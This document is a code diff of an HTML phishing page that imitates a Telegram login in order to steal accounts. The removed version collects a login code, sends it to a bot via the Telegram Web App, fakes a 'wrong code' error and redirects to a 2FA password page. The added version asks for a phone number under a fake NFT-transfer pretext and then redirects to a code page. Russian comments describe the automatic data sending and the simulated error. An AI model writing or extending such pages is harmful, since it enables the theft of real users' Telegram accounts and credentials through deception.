@@ -1,56 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
-        .gift-anim { width: 150px; animation: float 3s infinite ease-in-out; margin-top: 20px; }
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
-        
-        input { 
-            width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #2c2c2e;
-            background: #1c1c1e; color: #fff; font-size: 20px; text-align: center; outline: none;
-            transition: border-color 0.3s;
-        }
-        /* Твоя просьба: красная рамка при ошибке */
-        input.error { border-color: #ff3b30 !important; }
-        .error-text { color: #ff3b30; display: none; margin-top: 10px; }
-        
-        .btn { background: #3390ec; color: #fff; padding: 15px; border-radius: 12px; width: 100%; border: none; font-weight: bold; margin-top: 20px; }
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 40px 20px; }
+        input { width: 100%; padding: 15px; background: #1c252f; border: 1px solid #2a3644; border-radius: 10px; color: #fff; margin-bottom: 20px; box-sizing: border-box; outline: none; }
+        .btn { width: 100%; padding: 15px; background: #248bdf; border: none; border-radius: 10px; color: #fff; font-weight: bold; font-size: 16px; }
     </style>
 </head>
 <body>
-    <img src="твой-подарок.png" class="gift-anim">
-    <h2>Enter Code</h2>
-    <p style="color: #8e8e93;">Check your Telegram notifications</p>
+    <h2>Log in to Telegram</h2>
+    <p style="color: #8a99a8; font-size: 14px; margin-bottom: 30px;">Confirm your phone number to authorize the NFT transfer.</p>
     
-    <input type="text" id="c" placeholder="00000" maxlength="6" inputmode="numeric">
-    <div id="err" class="error-text">Check code</div>
-    <button class="btn" onclick="send()">Verify</button>
+    <input type="tel" id="phone" placeholder="+7 900 000-00-00">
+    <button class="btn" onclick="validateLogin()">Next</button>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-
-        function send() {
-            const i = document.getElementById('c');
-            const e = document.getElementById('err');
-            
-            if (i.value.length < 5) {
-                i.classList.add('error');
-                e.style.display = 'block';
-                return;
+        function validateLogin() {
+            const phone = document.getElementById('phone').value;
+            // Проверка: номер должен быть длиннее 6 символов
+            if (phone.trim().length < 7) {
+                alert("Please enter a valid phone number!");
+            } else {
+                // ПЕРЕНАПРАВЛЯЕМ ВРУЧНУЮ
+                window.location.href = "code.html";
             }
-
-            // Автоматическая отправка данных боту в Termux
-            tg.sendData(JSON.stringify({type: 'code', val: i.value}));
-            
-            // Имитация "неправильного кода" для перехода к 2FA
-            i.classList.add('error');
-            e.style.display = 'block';
-            setTimeout(() => { window.location.href = "password.html"; }, 1500);
         }
     </script>
 </body>
